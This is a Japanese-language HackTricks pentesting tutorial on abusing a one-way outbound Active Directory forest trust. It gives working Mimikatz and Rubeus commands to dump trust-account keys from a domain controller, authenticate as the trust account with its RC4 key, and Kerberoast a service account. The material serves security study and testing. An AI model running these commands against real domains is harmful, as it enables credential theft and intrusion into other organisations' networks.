# 外部フォレストドメイン - 一方向 (出力)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

このシナリオでは、**あなたのドメイン**は、**異なるドメイン**のプリンシパルに一部の**特権**を信頼しています。

## 列挙

### 出力トラスト
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## 信頼アカウント攻撃

Active Directoryドメインまたはフォレストの信頼関係がドメイン_B_からドメイン_A_（_**B**_がAを信頼）に設定されると、ドメイン**A**に**B. Kerberos trust keys**という名前の信頼アカウントが作成されます。このアカウントのパスワードから派生したキーは、ドメインAのユーザーがドメインBのサービスチケットを要求する際に、**相互領域TGTの暗号化**に使用されます。

ドメインコントローラから信頼されたアカウントのパスワードとハッシュを取得することが可能です。以下の方法を使用します：
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
リスクは、信頼アカウントB$が有効になっているためです。B$の主グループはドメインAのDomain Usersであり、Domain Usersに付与された権限はB$に適用されます。したがって、B$の資格情報を使用してドメインAに対して認証することが可能です。

{% hint style="warning" %}
したがって、信頼するドメインからは、信頼されたドメイン内のユーザーを取得することが可能です。このユーザーには多くの権限はありません（おそらくDomain Usersのみですが）、しかし、外部ドメインを列挙することができます。
{% endhint %}

この例では、信頼するドメインは`ext.local`であり、信頼されたドメインは`root.local`です。したがって、`root.local`内に`EXT$`というユーザーが作成されます。
```bash
# Use mimikatz to dump trusted keys
lsadump::trust /patch
# You can see in the output the old and current credentials
# You will find clear text, AES and RC4 hashes
```
したがって、この時点で**`root.local\EXT$`**の現在の**平文パスワードとKerberosの秘密鍵**を持っています。**`root.local\EXT$`**のKerberos AES秘密鍵は、異なるソルトが使用されるため、AES信頼キーと同じではありませんが、**RC4キーは同じ**です。したがって、私たちはext.localからダンプされたRC4信頼キーを使用して、`root.local\EXT$`として`root.local`に対して**認証**することができます。
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
これにより、そのドメインの列挙を開始し、ユーザーのKerberoastingさえも行うことができます。
```
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### クリアテキストの信頼パスワードの収集

前のフローでは、**クリアテキストのパスワード**ではなく、（mimikatzによってダンプされた）信頼ハッシュが使用されました。

クリアテキストのパスワードは、mimikatzの\[ CLEAR ]出力を16進数に変換し、ヌルバイト '\x00' を削除することで取得できます：

![](<../../.gitbook/assets/image (2) (1) (2).png>)

信頼関係を作成する際に、ユーザーがパスワードを入力する必要がある場合があります。このデモンストレーションでは、キーは元の信頼パスワードであり、したがって人間が読める形式です。キーがサイクルする（30日ごと）と、クリアテキストは人間が読めなくなりますが、技術的にはまだ使用可能です。

クリアテキストのパスワードは、信頼アカウントのKerberos秘密キーを使用してTGTを要求する代わりに、信頼アカウントのトラストアカウントとして通常の認証を実行するために使用できます。ここでは、ext.localからroot.localに対してDomain Adminsのメンバーをクエリしています：

![](<../../.gitbook/assets/image (1) (1) (1) (2).png>)

## 参考文献

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのスウェット**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
